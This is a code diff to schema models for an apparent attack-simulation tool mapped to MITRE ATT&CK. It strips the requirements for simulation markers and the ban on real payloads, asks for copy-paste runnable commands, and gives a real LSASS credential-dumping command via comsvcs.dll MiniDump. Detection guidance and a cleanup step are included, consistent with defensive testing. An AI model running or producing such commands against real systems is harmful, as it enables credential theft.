@@ -66,37 +66,42 @@ class Executor(BaseModel):
 
     name: ExecutorType = Field(
         description=(
-            "Executor type: 'powershell', 'cmd', 'bash', 'zsh', 'python', "
-            "'aws_cli', 'az_cli', etc. Must be a valid ExecutorType enum value. "
-            "Determines the interpreter used to run the command."
+            "Interpreter to execute the command. Must match the target platform: "
+            "powershell/cmd for windows, bash/sh for linux, zsh/bash for macos, "
+            "aws_cli/az_cli/gcloud_cli for cloud platforms."
         )
     )
     platform: Platform = Field(
         description=(
-            "Target platform: 'windows', 'linux', 'macos', "
-            "'cloud_aws', 'cloud_azure', 'cloud_gcp'."
+            "Target OS or cloud environment where this executor runs."
         )
     )
     privilege_required: PrivilegeLevel = Field(
-        description="Minimum privilege level required: 'user', 'admin', 'system', 'root'."
+        description="Minimum privilege level required to execute the command."
     )
     command: str = Field(
         description=(
-            "The simulation command to execute. MUST include a simulation marker "
-            "(e.g., '# SIMULATION ONLY — T1003.001'). Must use dummy artifacts and "
-            "be reversible. Must NOT contain real exploit payloads or destructive operations."
+            "Complete, copy-paste executable command for the target interpreter. "
+            "Must be syntactically valid and runnable as-is in the declared shell. "
+            "Use real OS binary names, correct flags, proper escaping, and real "
+            "filesystem paths. No placeholder values like <target> or <ip>. "
+            "No inline comments explaining what the command does. "
+            "Prefer techniques that create or modify reversible artifacts "
+            "(temp files, scheduled tasks, registry keys)."
         )
     )
     payload_description: str = Field(
         description=(
-            "Human-readable description of what this executor does in simulation context. "
-            "Explains the technique being simulated and expected behavior."
+            "Human-readable explanation of what this executor does, which "
+            "technique it simulates, and what defensive telemetry it triggers. "
+            "All explanatory text goes here, NOT inside the command field."
         )
     )
     cleanup_procedure: str = Field(
         description=(
-            "Command(s) to reverse any changes made by the simulation. "
-            "REQUIRED for every executor — must undo all modifications."
+            "Complete, copy-paste executable cleanup command that undoes exactly "
+            "what the command field does. Must be runnable as-is in the same "
+            "interpreter. No placeholders, no inline comments."
         )
     )
 
@@ -108,16 +113,17 @@ class Executor(BaseModel):
                     "platform": "windows",
                     "privilege_required": "admin",
                     "command": (
-                        "# SIMULATION ONLY — T1003.001\n"
-                        "rundll32.exe comsvcs.dll, MiniDump "
-                        "(Get-Process lsass).Id $env:TEMP\\sim_lsass.dmp full"
+                        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
+                        "MiniDump (Get-Process lsass).Id "
+                        "$env:TEMP\\lsass_dump.dmp full"
                     ),
                     "payload_description": (
-                        "Uses comsvcs.dll MiniDump to create a minidump of the LSASS process. "
-                        "Simulation-safe: dump written to temp directory with simulation marker."
+                        "Dumps LSASS process memory via comsvcs.dll MiniDump export. "
+                        "Triggers Sysmon Event ID 10 (ProcessAccess) and Windows "
+                        "Defender Credential Guard alerts. Used by APT29 and APT28."
                     ),
                     "cleanup_procedure": (
-                        "Remove-Item $env:TEMP\\sim_lsass.dmp "
+                        "Remove-Item -Path $env:TEMP\\lsass_dump.dmp "
                         "-Force -ErrorAction SilentlyContinue"
                     ),
                 }
@@ -376,9 +382,11 @@ class Ability(BaseModel):
                     "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
                     "name": "LSASS Memory Credential Dumping via comsvcs.dll",
                     "description": (
-                        "Simulates credential dumping from LSASS process memory using "
-                        "comsvcs.dll MiniDump. This technique is commonly used by APT29 "
-                        "and APT28 for credential harvesting in enterprise Windows environments."
+                        "Dumps LSASS process memory using the comsvcs.dll MiniDump "
+                        "export to harvest cached credentials. This sub-technique "
+                        "(T1003.001) is used by APT29, APT28, and Wizard Spider in "
+                        "enterprise Windows environments to extract NTLM hashes and "
+                        "Kerberos tickets from memory."
                     ),
                     "attack_category": "credential_access",
                     "mitre_mapping": {
@@ -387,7 +395,7 @@ class Ability(BaseModel):
                         "sub_technique": "T1003.001",
                     },
                     "threat_intel_context": {
-                        "associated_groups": ["APT29", "APT28", "Lazarus Group"],
+                        "associated_groups": ["APT29", "APT28", "Wizard Spider"],
                         "associated_tools": ["Mimikatz", "ProcDump", "comsvcs.dll"],
                         "recent_campaigns": [
                             {
@@ -399,7 +407,9 @@ class Ability(BaseModel):
                             }
                         ],
                         "detection_guidance": (
-                            "Monitor for access to LSASS process. Enable Credential Guard."
+                            "Monitor for access to LSASS process via Sysmon Event ID 10. "
+                            "Enable Credential Guard. Alert on rundll32.exe loading "
+                            "comsvcs.dll with MiniDump export."
                         ),
                     },
                     "executors": [
@@ -408,15 +418,16 @@ class Ability(BaseModel):
                             "platform": "windows",
                             "privilege_required": "admin",
                             "command": (
-                                "# SIMULATION ONLY — T1003.001\n"
-                                "rundll32.exe comsvcs.dll, MiniDump "
-                                "(Get-Process lsass).Id $env:TEMP\\sim_lsass.dmp full"
+                                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
+                                "MiniDump (Get-Process lsass).Id "
+                                "$env:TEMP\\lsass_dump.dmp full"
                             ),
                             "payload_description": (
-                                "Uses comsvcs.dll MiniDump for LSASS memory dump simulation."
+                                "Dumps LSASS process memory via comsvcs.dll MiniDump. "
+                                "Triggers Sysmon Event ID 10 and Defender alerts."
                             ),
                             "cleanup_procedure": (
-                                "Remove-Item $env:TEMP\\sim_lsass.dmp "
+                                "Remove-Item -Path $env:TEMP\\lsass_dump.dmp "
                                 "-Force -ErrorAction SilentlyContinue"
                             ),
                         }
